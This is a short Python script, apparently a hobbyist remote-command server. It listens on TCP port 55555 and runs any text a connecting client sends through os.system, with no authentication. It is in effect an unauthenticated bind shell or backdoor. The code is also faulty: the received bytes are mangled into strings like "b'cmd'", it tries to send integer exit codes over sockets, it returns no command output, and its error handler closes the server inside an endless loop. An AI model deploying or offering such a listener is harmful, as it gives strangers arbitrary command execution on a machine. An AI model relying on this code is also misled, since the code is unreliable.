__author__ = 'RetR0'

import os
import threading
import socket

host = (socket.gethostbyname(socket.gethostname()))

port = int('55555')

client_list = []

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen()

def sending(response):
    for client in client_list:
        client.send(response)


def command(it):
    response = os.system(f'{it}')    
    sending(response)

def handle(client):
    while True:
        try:
            it = client.recv(3072)
            command(it)
            
        except:
            print("Error")
            server.close()

def main():
    while True:
        client, address = server.accept()
        client_list.append(client)
        print (f"\nNew user connected at {address}")
        thread = threading.Thread(target=handle, args=(client,))
        thread.start()

print(f"Server running on {host}, {port}")

main()
